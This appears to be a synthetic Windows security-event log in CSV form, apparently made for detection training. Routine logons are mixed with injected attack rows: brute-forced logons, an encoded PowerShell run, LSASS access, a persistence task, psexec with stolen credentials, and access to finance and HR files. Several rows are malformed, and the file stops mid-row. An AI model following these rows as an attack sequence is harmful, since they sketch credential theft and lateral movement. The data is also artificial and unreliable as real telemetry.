TimeCreated,EventID,AccountName,LogonType,SourceIP,Computer,Process_Name,CommandLine,AdditionalInfo
2024-01-08 08:22:00,4624,mike,2,192.168.1.20,WIN-01,,,
2024-01-08 08:31:00,4624,mike,2,192.168.1.20,WIN-01,,,
2024-01-08 08:41:00,4624,mike,2,192.168.1.21,WIN-02,,,
2024-01-08 08:45:00,4624,sarah,2,192.168.1.21,WIN-01,,,
2024-01-08 08:53:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-08 09:03:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-08 09:13:00,4624,sarah,2,192.168.1.21,WIN-01,,,
2024-01-08 09:22:00,4624,sarah,2,192.168.1.20,WIN-01,,,
2024-01-08 09:25:00,4624,mike,2,192.168.1.21,WIN-02,,,
2024-01-08 09:30:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-08 09:40:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-08 09:43:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-08 09:48:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-08 09:54:00,4624,mike,2,192.168.1.20,WIN-02,,,
2024-01-08 09:58:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-08 10:01:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-08 10:07:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-08 10:17:00,4624,john,2,192.168.1.21,WIN-03,,,
2024-01-08 10:25:00,4624,john,2,192.168.1.22,WIN-02,,,
2024-01-08 10:34:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-08 10:41:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-08 10:48:00,4624,mike,2,192.168.1.22,WIN-03,,,
2024-01-08 10:58:00,4624,mike,2,192.168.1.20,WIN-02,,,
2024-01-08 11:04:00,4624,sarah,2,192.168.1.20,WIN-03,,,
2024-01-08 11:11:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-08 11:16:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-08 11:23:00,4624,sarah,2,192.168.1.20,WIN-01,,,
2024-01-08 11:29:00,4624,sarah,2,192.168.1.21,WIN-01,,,
2024-01-08 11:38:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-08 11:48:00,4624,john,2,192.168.1.20,WIN-01,,,
2024-01-08 11:57:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-08 12:07:00,4624,sarah,2,192.168.1.20,WIN-01,,,
2024-01-08 12:13:00,4624,john,2,192.168.1.20,WIN-02,,,
2024-01-08 12:21:00,4624,john,2,192.168.1.22,WIN-01,,,
2024-01-08 12:31:00,4624,sarah,2,192.168.1.22,WIN-02,,,
2024-01-08 12:34:00,4624,john,2,192.168.1.22,WIN-02,,,
2024-01-08 13:00:00,EVENT_ID,john,File Created,C:\Users\john\Downloads\invoice_URGENT.pdf,192.168.1.21,WIN-01,,,
2024-01-08 13:01:00,4688,john,Process Created,powershell.exe -encodedCommand [malicious],192.168.1.21,WIN-01,,,
2024-01-08 13:02:00,4663,john,Object Access,LSASS.exe,SeDebugPrivilege,192.168.1.21,WIN-01,,,
2024-01-08 13:03:00,EVENT_ID,john,File Access,C:\Users\john\Documents\*,192.168.1.21,WIN-01,,,
2024-01-08 13:04:00,EVENT_ID,john,File Access,C:\Users\john\Documents\*,192.168.1.21,WIN-01,,,
2024-01-08 13:05:00,EVENT_ID,john,File Access,C:\Users\john\Documents\*,192.168.1.21,WIN-01,,,
2024-01-08 13:06:00,EVENT_ID,john,Scheduled Task Created,Malware Persistence Task,192.168.1.21,WIN-01,,,
2024-01-08 14:00:00,4625,mike,2,192.168.1.22,WIN-03,,,
2024-01-08 14:00:20,4624,mike,2,192.168.1.22,WIN-03,,,
2024-01-08 14:05:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:10:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:15:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:20:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:25:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:30:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:35:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:40:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:45:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:50:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-08 14:55:20,4672,it_support,2,192.168.1.50,WIN-ADMIN,,,
2024-01-08 14:55:20,4624,it_support,2,192.168.1.50,WIN-ADMIN,,,
2024-01-08 15:05:20,4625,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:05:30,4625,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:05:40,4625,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:05:50,4625,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:06:00,4625,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:06:10,4625,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:06:20,4624,john,3,203.0.113.88,WIN-01,,,
2024-01-08 15:07:20,4672,admin,2,203.0.113.88,WIN-ADMIN,,,
2024-01-08 15:07:20,4624,admin,2,203.0.113.88,WIN-ADMIN,,,
2024-01-08 15:09:20,EVENT_ID,admin,Process Created,psexec.exe \\WIN-DC -u admin -p [stolen],203.0.113.88,WIN-ADMIN,,,
2024-01-08 15:12:20,EVENT_ID,admin,File Access,C:\Finance\*.xlsx,C:\HR\*.pdf,203.0.113.88,WIN-DC,,,
2024-01-08 18:00:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-08 18:11:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-08 18:40:00,4624,john,2,192.168.1.20,WIN-02,,,
2024-01-08 19:10:00,4624,mike,2,192.168.1.22,WIN-03,,,
2024-01-08 19:25:00,4624,john,2,192.168.1.20,WIN-01,,,
2024-01-08 19:36:00,4624,john,2,192.168.1.20,WIN-02,,,
2024-01-08 19:47:00,4624,sarah,2,192.168.1.21,WIN-01,,,
2024-01-08 20:16:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-08 20:36:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-08 20:48:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-08 21:07:00,4624,mike,2,192.168.1.20,WIN-01,,,
2024-01-08 21:35:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-08 22:00:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-08 22:24:00,4624,john,2,192.168.1.22,WIN-03,,,
2024-01-08 22:43:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-09 08:00:00,4624,sarah,2,192.168.1.21,WIN-02,,,
2024-01-09 08:09:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-09 08:13:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-09 08:23:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-09 08:31:00,4624,john,2,192.168.1.21,WIN-03,,,
2024-01-09 08:36:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-09 08:39:00,4624,john,2,192.168.1.21,WIN-03,,,
2024-01-09 08:44:00,4624,mike,2,192.168.1.21,WIN-03,,,
2024-01-09 08:47:00,4624,mike,2,192.168.1.21,WIN-03,,,
2024-01-09 08:54:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-09 09:03:00,4624,mike,2,192.168.1.20,WIN-03,,,
2024-01-09 09:10:00,4624,mike,2,192.168.1.22,WIN-03,,,
2024-01-09 09:18:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-09 09:24:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-09 09:28:00,4624,john,2,192.168.1.20,WIN-01,,,
2024-01-09 09:31:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-09 09:34:00,4624,john,2,192.168.1.22,WIN-02,,,
2024-01-09 09:42:00,4624,mike,2,192.168.1.20,WIN-02,,,
2024-01-09 09:51:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-09 09:56:00,4624,sarah,2,192.168.1.20,WIN-03,,,
2024-01-09 10:05:00,4624,mike,2,192.168.1.20,WIN-02,,,
2024-01-09 10:12:00,4624,mike,2,192.168.1.20,WIN-01,,,
2024-01-09 10:16:00,4624,john,2,192.168.1.22,WIN-02,,,
2024-01-09 10:26:00,4624,sarah,2,192.168.1.22,WIN-02,,,
2024-01-09 10:34:00,4624,mike,2,192.168.1.20,WIN-03,,,
2024-01-09 10:44:00,4624,sarah,2,192.168.1.22,WIN-02,,,
2024-01-09 10:48:00,4624,sarah,2,192.168.1.22,WIN-03,,,
2024-01-09 10:52:00,4624,sarah,2,192.168.1.21,WIN-02,,,
2024-01-09 11:01:00,4624,mike,2,192.168.1.20,WIN-03,,,
2024-01-09 11:10:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-09 11:17:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-09 11:23:00,4624,mike,2,192.168.1.21,WIN-01,,,
2024-01-09 11:27:00,4624,sarah,2,192.168.1.21,WIN-02,,,
2024-01-09 11:34:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-09 11:41:00,4624,mike,2,192.168.1.20,WIN-02,,,
2024-01-09 11:44:00,4624,john,2,192.168.1.20,WIN-02,,,
2024-01-09 11:54:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-09 12:01:00,4624,john,2,192.168.1.20,WIN-02,,,
2024-01-09 12:09:00,4624,john,2,192.168.1.21,WIN-03,,,
2024-01-09 12:19:00,4624,sarah,2,192.168.1.22,WIN-03,,,
2024-01-09 14:00:00,4625,mike,2,192.168.1.22,WIN-03,,,
2024-01-09 14:00:20,4624,mike,2,192.168.1.22,WIN-03,,,
2024-01-09 14:05:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:10:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:15:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:20:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:25:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:30:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:35:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:40:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:45:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:50:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-09 14:55:20,4672,it_support,2,192.168.1.50,WIN-ADMIN,,,
2024-01-09 14:55:20,4624,it_support,2,192.168.1.50,WIN-ADMIN,,,
2024-01-09 15:05:20,4625,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:05:30,4625,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:05:40,4625,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:05:50,4625,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:06:00,4625,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:06:10,4625,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:06:20,4624,john,3,203.0.113.45,WIN-01,,,
2024-01-09 15:07:20,4672,admin,2,203.0.113.45,WIN-ADMIN,,,
2024-01-09 15:07:20,4624,admin,2,203.0.113.45,WIN-ADMIN,,,
2024-01-09 15:09:20,EVENT_ID,admin,Process Created,psexec.exe \\WIN-DC -u admin -p [stolen],203.0.113.45,WIN-ADMIN,,,
2024-01-09 15:12:20,EVENT_ID,admin,File Access,C:\Finance\*.xlsx,C:\HR\*.pdf,203.0.113.45,WIN-DC,,,
2024-01-09 18:00:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-09 18:15:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-09 18:36:00,4624,john,2,192.168.1.22,WIN-02,,,
2024-01-09 18:47:00,4624,mike,2,192.168.1.21,WIN-01,,,
2024-01-09 19:06:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-09 19:22:00,4624,mike,2,192.168.1.21,WIN-02,,,
2024-01-09 19:33:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-09 19:59:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-09 20:22:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-09 20:37:00,4624,john,2,192.168.1.20,WIN-01,,,
2024-01-09 20:51:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-09 21:01:00,4624,mike,2,192.168.1.21,WIN-03,,,
2024-01-09 21:14:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-09 21:33:00,4624,mike,2,192.168.1.21,WIN-02,,,
2024-01-09 21:55:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-10 08:00:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-10 08:04:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-10 08:07:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-10 08:12:00,4624,john,2,192.168.1.22,WIN-01,,,
2024-01-10 08:21:00,4624,sarah,2,192.168.1.20,WIN-01,,,
2024-01-10 08:28:00,4624,sarah,2,192.168.1.22,WIN-03,,,
2024-01-10 08:33:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-10 08:38:00,4624,sarah,2,192.168.1.22,WIN-01,,,
2024-01-10 08:41:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-10 08:44:00,4624,john,2,192.168.1.22,WIN-01,,,
2024-01-10 08:48:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-10 08:52:00,4624,sarah,2,192.168.1.22,WIN-02,,,
2024-01-10 08:57:00,4624,mike,2,192.168.1.21,WIN-01,,,
2024-01-10 09:01:00,4624,john,2,192.168.1.21,WIN-03,,,
2024-01-10 09:06:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-10 09:13:00,4624,sarah,2,192.168.1.20,WIN-03,,,
2024-01-10 09:17:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-10 09:24:00,4624,john,2,192.168.1.21,WIN-03,,,
2024-01-10 09:31:00,4624,sarah,2,192.168.1.21,WIN-02,,,
2024-01-10 09:38:00,4624,mike,2,192.168.1.21,WIN-01,,,
2024-01-10 09:42:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-10 09:50:00,4624,mike,2,192.168.1.20,WIN-03,,,
2024-01-10 10:00:00,4624,john,2,192.168.1.20,WIN-01,,,
2024-01-10 10:04:00,4624,mike,2,192.168.1.21,WIN-03,,,
2024-01-10 10:08:00,4624,mike,2,192.168.1.22,WIN-01,,,
2024-01-10 10:17:00,4624,sarah,2,192.168.1.21,WIN-03,,,
2024-01-10 10:22:00,4624,mike,2,192.168.1.20,WIN-02,,,
2024-01-10 10:32:00,4624,mike,2,192.168.1.21,WIN-03,,,
2024-01-10 10:40:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-10 10:45:00,4624,sarah,2,192.168.1.21,WIN-01,,,
2024-01-10 10:49:00,4624,john,2,192.168.1.21,WIN-02,,,
2024-01-10 10:59:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-10 11:08:00,4624,john,2,192.168.1.22,WIN-02,,,
2024-01-10 11:15:00,4624,mike,2,192.168.1.20,WIN-03,,,
2024-01-10 11:22:00,4624,mike,2,192.168.1.22,WIN-02,,,
2024-01-10 11:27:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-10 11:37:00,4624,john,2,192.168.1.21,WIN-01,,,
2024-01-10 11:43:00,4624,sarah,2,192.168.1.20,WIN-01,,,
2024-01-10 11:49:00,4624,mike,2,192.168.1.20,WIN-01,,,
2024-01-10 11:59:00,4624,sarah,2,192.168.1.22,WIN-02,,,
2024-01-10 14:00:00,4625,mike,2,192.168.1.22,WIN-03,,,
2024-01-10 14:00:20,4624,mike,2,192.168.1.22,WIN-03,,,
2024-01-10 14:05:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:10:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:15:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:20:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:25:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:30:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:35:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:40:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:45:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:50:20,4624,svc_backup,3,10.0.0.10,WIN-DC,,,
2024-01-10 14:55:20,4672,it_support,2,192.168.1.50,WIN-ADMIN,,,
2024-01-10 14:55:20,4624,it_support,
